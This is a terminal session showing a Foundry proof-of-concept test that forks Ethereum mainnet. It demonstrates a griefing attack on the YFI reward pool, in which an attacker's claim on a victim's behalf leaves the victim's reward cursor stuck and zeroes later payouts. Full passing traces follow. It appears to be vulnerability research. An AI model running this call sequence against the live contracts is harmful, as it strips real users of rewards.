root@Gandhi:/home/gajnithehero/smtgcrazy# cat test/test.sol
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function approve(address,uint256) external returns (bool);
}
interface IVotingYFI {
    function token() external view returns (address);
    function modify_lock(
        uint256 amount,
        uint256 unlock_time,
        address user
    ) external;
    function withdraw() external;
    function balanceOf(address user, uint256 ts)
        external
        view
        returns (uint256);
    function epoch(address user) external view returns (uint256);
}
interface IYFIRewardPool {
    function claim(address user, bool relock) external returns (uint256);
    function burn(uint256 amount) external returns (bool);
    function checkpoint_total_supply() external;
    function checkpoint_token() external;
    function start_time() external view returns (uint256);
    function last_token_time() external view returns (uint256);
    function time_cursor_of(address user)
        external
        view
        returns (uint256);
    function token() external view returns (address);
    function veyfi() external view returns (address);
}
contract YFIRewardPoolGriefingTest is Test {
    // --- mainnet addresses ---
    address constant YFI_REWARD_POOL =
        0xb287a1964AEE422911c7b8409f5E5A273c1412fA;
    address constant VEYFI =
        0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5;
    // actors
    address victim   = address(0xBEEF);
    address attacker = address(0xABCD);
    address safeUser = address(0xCAFE);
    address funder   = address(0xF00D);
    IVotingYFI      ve;
    IYFIRewardPool  pool;
    IERC20          yfi;
    uint256 constant WEEK = 7 days;
    function setUp() public {
        string memory rpc = vm.envString("MAINNET_RPC_URL");
        vm.createSelectFork(rpc);
        ve   = IVotingYFI(VEYFI);
        pool = IYFIRewardPool(YFI_REWARD_POOL);
        yfi  = IERC20(ve.token());
        deal(address(yfi), funder,   1_000_000e18);
        deal(address(yfi), victim,   1_000e18);
        deal(address(yfi), safeUser, 1_000e18);
    }
function testGriefingBricksFutureRewards() public {
        vm.startPrank(victim);
        yfi.approve(address(ve), type(uint256).max);
        uint256 unlockTime1 = block.timestamp + 4 weeks;
        ve.modify_lock(100e18, unlockTime1, victim);
        vm.stopPrank();
        vm.warp(unlockTime1 + 1);
        vm.startPrank(victim);
        ve.withdraw();
        vm.stopPrank();
        vm.prank(attacker);
        uint256 attackerClaimResult = pool.claim(victim, false);
        emit log_named_uint("attackerClaimResult", attackerClaimResult);
        uint256 cursorAfterAttack = pool.time_cursor_of(victim);
        emit log_named_uint("cursorAfterAttack", cursorAfterAttack);
        assertGt(cursorAfterAttack, 0, "cursor should be initialized");
        uint256 unlockTime2 = block.timestamp + 8 weeks;
        vm.startPrank(victim);
        yfi.approve(address(ve), type(uint256).max);
        ve.modify_lock(200e18, unlockTime2, victim);
        vm.stopPrank();
        vm.startPrank(safeUser);
        yfi.approve(address(ve), type(uint256).max);
        ve.modify_lock(200e18, unlockTime2, safeUser);
        vm.stopPrank();
        uint256 victimVeNow   = ve.balanceOf(victim,   block.timestamp);
        uint256 safeUserVeNow = ve.balanceOf(safeUser, block.timestamp);
        emit log_named_uint("victim veYFI now", victimVeNow);
        emit log_named_uint("safeUser veYFI now", safeUserVeNow);
        assertGt(victimVeNow, 0,   "victim should have veYFI again");
        assertGt(safeUserVeNow, 0, "safeUser should have veYFI");
        vm.warp(block.timestamp + 2 days);
        vm.startPrank(funder);
        yfi.approve(address(pool), type(uint256).max);
        pool.burn(1_000e18);
        vm.stopPrank();
        vm.warp(block.timestamp + 8 days);
        pool.checkpoint_token();
        pool.checkpoint_total_supply();
        vm.prank(safeUser);
        uint256 safeClaim = pool.claim(safeUser, false);
        emit log_named_uint("safeUser claim", safeClaim);
        assertGt(safeClaim, 0, "safe user should receive some rewards");
        vm.prank(victim);
        uint256 victimClaim1 = pool.claim(victim, false);
        emit log_named_uint("victim claim #1", victimClaim1);
        assertEq(victimClaim1, 0, "victim receives no rewards");
        uint256 cursorAfterVictimClaim = pool.time_cursor_of(victim);
        emit log_named_uint("cursorAfterVictimClaim", cursorAfterVictimClaim);
        assertEq(
            cursorAfterVictimClaim,
            cursorAfterAttack,
            "victim time_cursor_of is stuck on zero-balance week"
        );
        uint256 victimVeFinal = ve.balanceOf(victim, block.timestamp);
        assertGt(victimVeFinal, 0, "victim still has veYFI at end");
}
}

root@Gandhi:/home/gajnithehero/smtgcrazy# forge test -vvvv
[⠒] Compiling...
No files changed, compilation skipped

Ran 1 test for test/test.sol:YFIRewardPoolGriefingTest
[PASS] testGriefingBricksFutureRewards() (gas: 2290428)
Logs:
  attackerClaimResult: 0
  cursorAfterAttack: 1766016000
  victim veYFI now: 6814922924296467540
  safeUser veYFI now: 6814922924296467540
  safeUser claim: 3412975808414828389
  victim claim #1: 0
  cursorAfterVictimClaim: 1766016000

Traces:
  [2347028] YFIRewardPoolGriefingTest::testGriefingBricksFutureRewards()
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [24665] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::approve(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000bEEF, spender: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [334745] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::modify_lock(100000000000000000000 [1e20], 1766567867 [1.766e9], 0x000000000000000000000000000000000000bEEF)
    │   ├─ [15872] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::transferFrom(0x000000000000000000000000000000000000bEEF, 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 100000000000000000000 [1e20])
    │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000bEEF, to: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 100000000000000000000 [1e20])
    │   │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000bEEF, spender: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 115792089237316195423570985008687907853269984665640564039357584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ emit Supply(: 1561474600102638461746 [1.561e21], : 1661474600102638461746 [1.661e21], : 1764148667 [1.764e9])
    │   ├─ emit ModifyLock(param0: 0x000000000000000000000000000000000000bEEF, param1: 0x000000000000000000000000000000000000bEEF, param2: 100000000000000000000 [1e20], param3: 1766016000 [1.766e9], param4: 1764148667 [1.764e9])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000069434400
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::warp(1766567868 [1.766e9])
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [517657] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::withdraw()
    │   ├─ [3452] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::transfer(0x000000000000000000000000000000000000bEEF, 100000000000000000000 [1e20])
    │   │   ├─ emit Transfer(from: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, to: 0x000000000000000000000000000000000000bEEF, value: 100000000000000000000 [1e20])
    │   │   └─ ← [Return] true
    │   ├─ emit Withdraw(param0: 0x000000000000000000000000000000000000bEEF, param1: 100000000000000000000 [1e20], param2: 1766567868 [1.766e9])
    │   ├─ emit Supply(: 1661474600102638461746 [1.661e21], : 1561474600102638461746 [1.561e21], : 1766567868 [1.766e9])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000ABcD)
    │   └─ ← [Return]
    ├─ [304477] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::claim(0x000000000000000000000000000000000000bEEF, false)
    │   ├─ [91550] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::checkpoint()
    │   │   └─ ← [Stop]
    │   ├─ [19416] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::find_epoch_by_timestamp(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1764201600 [1.764e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000552
    │   ├─ [1212] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::point_history(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1362) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000004b0e11a51262a1340000000000000000000000000000000000000000000000000000000b723f85f485000000000000000000000000000000000000000000000000000000006927948000000000000000000000000000000000000000000000000000000000016c68f7
    │   ├─ [5888] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::find_epoch_by_timestamp(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1764806400 [1.764e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000553
    │   ├─ [1212] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::point_history(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1363) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000004aa46fcdd8ad93cf8000000000000000000000000000000000000000000000000000000b723f85f485000000000000000000000000000000000000000000000000000000006930cf0000000000000000000000000000000000000000000000000000000000016c68f7
    │   ├─ [5842] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::find_epoch_by_timestamp(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1765411200 [1.765e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000554
    │   ├─ [1212] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::point_history(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1364) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000004a3acdf69ef8866b0000000000000000000000000000000000000000000000000000000b723f85f48500000000000000000000000000000000000000000000000000000000693a098000000000000000000000000000000000000000000000000000000000016c68f7
    │   ├─ [5370] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::find_epoch_by_timestamp(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1766016000 [1.766e9]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000555
    │   ├─ [1212] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::point_history(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1365) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000049d12c1f654379068000000000000000000000000000000000000000000000000000000ab92a709d23000000000000000000000000000000000000000000000000000000006943440000000000000000000000000000000000000000000000000000000000016c68f7
    │   ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   │   └─ ← [Return] 11848542592341499871 [1.184e19]
    │   ├─ emit CheckpointToken(: 1766567868 [1.766e9], : 0)
    │   ├─ [756] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::epoch(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   │   └─ ← [Return] 2
    │   ├─ [1212] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::point_history(0x000000000000000000000000000000000000bEEF, 1) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000014999898be7ac96a000000000000000000000000000000000000000000000000000000b915155762000000000000000000000000000000000000000000000000000000006926c5bb00000000000000000000000000000000000000000000000000000000016c68f7
    │   ├─ [5528] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x000000000000000000000000000000000000bEEF, 1764201600 [1.764e9]) [staticcall]
    │   │   └─ ← [Return] 1442307692306476800 [1.442e18]
    │   ├─ [6213] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x000000000000000000000000000000000000bEEF, 1764806400 [1.764e9]) [staticcall]
    │   │   └─ ← [Return] 961538461537651200 [9.615e17]
    │   ├─ [6898] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x000000000000000000000000000000000000bEEF, 1765411200 [1.765e9]) [staticcall]
    │   │   └─ ← [Return] 480769230768825600 [4.807e17]
    │   ├─ emit Claimed(param0: 0x000000000000000000000000000000000000bEEF, param1: 0, param2: 1766016000 [1.766e9], param3: 2)
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "attackerClaimResult", val: 0)
    ├─ [595] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::time_cursor_of(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   └─ ← [Return] 1766016000 [1.766e9]
    ├─ emit log_named_uint(key: "cursorAfterAttack", val: 1766016000 [1.766e9])
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [2665] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::approve(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000bEEF, spender: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [270755] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::modify_lock(200000000000000000000 [2e20], 1771406268 [1.771e9], 0x000000000000000000000000000000000000bEEF)
    │   ├─ [11872] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::transferFrom(0x000000000000000000000000000000000000bEEF, 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 200000000000000000000 [2e20])
    │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000bEEF, to: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 200000000000000000000 [2e20])
    │   │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000bEEF, spender: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 115792089237316195423570985008687907853269984665640564039257584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ emit Supply(: 1561474600102638461746 [1.561e21], : 1761474600102638461746 [1.761e21], : 1766567868 [1.766e9])
    │   ├─ emit ModifyLock(param0: 0x000000000000000000000000000000000000bEEF, param1: 0x000000000000000000000000000000000000bEEF, param2: 200000000000000000000 [2e20], param3: 1770854400 [1.77e9], param4: 1766567868 [1.766e9])
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000ad78ebc5ac620000000000000000000000000000000000000000000000000000000000000698d1800
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000cafE)
    │   └─ ← [Return]
    ├─ [24665] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::approve(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000cafE, spender: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [288255] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::modify_lock(200000000000000000000 [2e20], 1771406268 [1.771e9], 0x000000000000000000000000000000000000cafE)
    │   ├─ [11072] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::transferFrom(0x000000000000000000000000000000000000cafE, 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 200000000000000000000 [2e20])
    │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000cafE, to: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 200000000000000000000 [2e20])
    │   │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000cafE, spender: 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, value: 115792089237316195423570985008687907853269984665640564039257584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ emit Supply(: 1761474600102638461746 [1.761e21], : 1961474600102638461746 [1.961e21], : 1766567868 [1.766e9])
    │   ├─ emit ModifyLock(param0: 0x000000000000000000000000000000000000cafE, param1: 0x000000000000000000000000000000000000cafE, param2: 200000000000000000000 [2e20], param3: 1770854400 [1.77e9], param4: 1766567868 [1.766e9])
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000ad78ebc5ac620000000000000000000000000000000000000000000000000000000000000698d1800
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [2118] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x000000000000000000000000000000000000bEEF, 1766567868 [1.766e9]) [staticcall]
    │   └─ ← [Return] 6814922924296467540 [6.814e18]
    ├─ [2118] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x000000000000000000000000000000000000cafE, 1766567868 [1.766e9]) [staticcall]
    │   └─ ← [Return] 6814922924296467540 [6.814e18]
    ├─ emit log_named_uint(key: "victim veYFI now", val: 6814922924296467540 [6.814e18])
    ├─ emit log_named_uint(key: "safeUser veYFI now", val: 6814922924296467540 [6.814e18])
    ├─ [0] VM::warp(1766740668 [1.766e9])
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000F00D)
    │   └─ ← [Return]
    ├─ [24665] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::approve(0xb287a1964AEE422911c7b8409f5E5A273c1412fA, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000F00D, spender: 0xb287a1964AEE422911c7b8409f5E5A273c1412fA, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [66653] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::burn(1000000000000000000000 [1e21])
    │   ├─ [13872] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::transferFrom(0x000000000000000000000000000000000000F00D, 0xb287a1964AEE422911c7b8409f5E5A273c1412fA, 1000000000000000000000 [1e21])
    │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000F00D, to: 0xb287a1964AEE422911c7b8409f5E5A273c1412fA, value: 1000000000000000000000 [1e21])
    │   │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000F00D, spender: 0xb287a1964AEE422911c7b8409f5E5A273c1412fA, value: 115792089237316195423570985008687907853269984665640564038457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ emit RewardReceived(param0: 0x000000000000000000000000000000000000F00D, param1: 1000000000000000000000 [1e21])
    │   ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   │   └─ ← [Return] 1011848542592341499871 [1.011e21]
    │   ├─ emit CheckpointToken(: 1766740668 [1.766e9], : 1000000000000000000000 [1e21])
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::warp(1767431868 [1.767e9])
    │   └─ ← [Return]
    ├─ [2622] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::checkpoint_token()
    │   ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0xb287a1964AEE422911c7b8409f5E5A273c1412fA) [staticcall]
    │   │   └─ ← [Return] 1011848542592341499871 [1.011e21]
    │   ├─ emit CheckpointToken(: 1767431868 [1.767e9], : 0)
    │   └─ ← [Stop]
    ├─ [349695] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::checkpoint_total_supply()
    │   ├─ [276932] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::checkpoint()
    │   │   └─ ← [Stop]
    │   ├─ [17370] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::find_epoch_by_timestamp(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1766620800 [1.766e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000055a
    │   ├─ [1212] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::point_history(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1370) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000004a29074f25936bc60000000000000000000000000000000000000000000000000000000da5978004e900000000000000000000000000000000000000000000000000000000694c7e8000000000000000000000000000000000000000000000000000000000016c68f7
    │   ├─ [5842] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::find_epoch_by_timestamp(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1767225600 [1.767e9]) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000055b
    │   ├─ [1212] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::point_history(0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5, 1371) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000049ab16a486a61b878000000000000000000000000000000000000000000000000000000da5978004e9000000000000000000000000000000000000000000000000000000006955b90000000000000000000000000000000000000000000000000000000000016c68f7
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000cafE)
    │   └─ ← [Return]
    ├─ [41041] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::claim(0x000000000000000000000000000000000000cafE, false)
    │   ├─ [756] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::epoch(0x000000000000000000000000000000000000cafE) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [1212] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::point_history(0x000000000000000000000000000000000000cafE, 1) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000005e93784aea5b7454000000000000000000000000000000000000000000000000000001722a2aaec500000000000000000000000000000000000000000000000000000000694bafbc00000000000000000000000000000000000000000000000000000000016c68f7
    │   ├─ [5010] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x000000000000000000000000000000000000cafE, 1766620800 [1.766e9]) [staticcall]
    │   │   └─ ← [Return] 6730769230767792000 [6.73e18]
    │   ├─ emit Claimed(param0: 0x000000000000000000000000000000000000cafE, param1: 3412975808414828389 [3.412e18], param2: 1767225600 [1.767e9], param3: 1)
    │   ├─ [3452] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::transfer(0x000000000000000000000000000000000000cafE, 3412975808414828389 [3.412e18])
    │   │   ├─ emit Transfer(from: 0xb287a1964AEE422911c7b8409f5E5A273c1412fA, to: 0x000000000000000000000000000000000000cafE, value: 3412975808414828389 [3.412e18])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 3412975808414828389 [3.412e18]
    ├─ emit log_named_uint(key: "safeUser claim", val: 3412975808414828389 [3.412e18])
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [13311] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::claim(0x000000000000000000000000000000000000bEEF, false)
    │   ├─ [756] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::epoch(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   │   └─ ← [Return] 3
    │   ├─ [5583] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x000000000000000000000000000000000000bEEF, 1766016000 [1.766e9]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ emit Claimed(param0: 0x000000000000000000000000000000000000bEEF, param1: 0, param2: 1766016000 [1.766e9], param3: 3)
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "victim claim #1", val: 0)
    ├─ [595] 0xb287a1964AEE422911c7b8409f5E5A273c1412fA::time_cursor_of(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   └─ ← [Return] 1766016000 [1.766e9]
    ├─ emit log_named_uint(key: "cursorAfterVictimClaim", val: 1766016000 [1.766e9])
    ├─ [7488] 0x90c1f9220d90d3966FbeE24045EDd73E1d588aD5::balanceOf(0x000000000000000000000000000000000000bEEF, 1767431868 [1.767e9]) [staticcall]
    │   └─ ← [Return] 5441296550670387540 [5.441e18]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 54.73s (48.85s CPU time)

Ran 1 test suite in 54.73s (54.73s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
